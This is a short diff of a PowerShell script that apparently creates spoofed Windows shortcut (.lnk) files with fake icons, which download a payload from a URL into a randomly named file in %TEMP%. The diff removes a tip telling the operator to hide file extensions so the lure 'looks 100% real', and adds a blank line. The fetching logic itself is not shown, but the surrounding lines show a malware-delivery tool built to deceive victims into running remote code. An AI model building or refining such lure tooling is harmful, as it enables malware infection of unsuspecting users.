@@ -76,7 +76,6 @@ if ($doSpoof) {
         Write-Host "Full path    : $finalPath"
         Write-Host "Icon         : $iconMsg"
         Write-Host ""
-        Write-Host "Tip: Enable 'Hide extensions for known file types' in Explorer -> looks 100% real"
     } catch {
         Write-Host "Spoof failed: $($_.Exception.Message)" -ForegroundColor Red
         Write-Host "Plain .lnk created: $initialPath"
@@ -88,4 +87,5 @@ if ($doSpoof) {
 }
 
 Write-Host "Payload URL : $url"
+
 Write-Host "Temp file   : $randomName (in %TEMP%)"
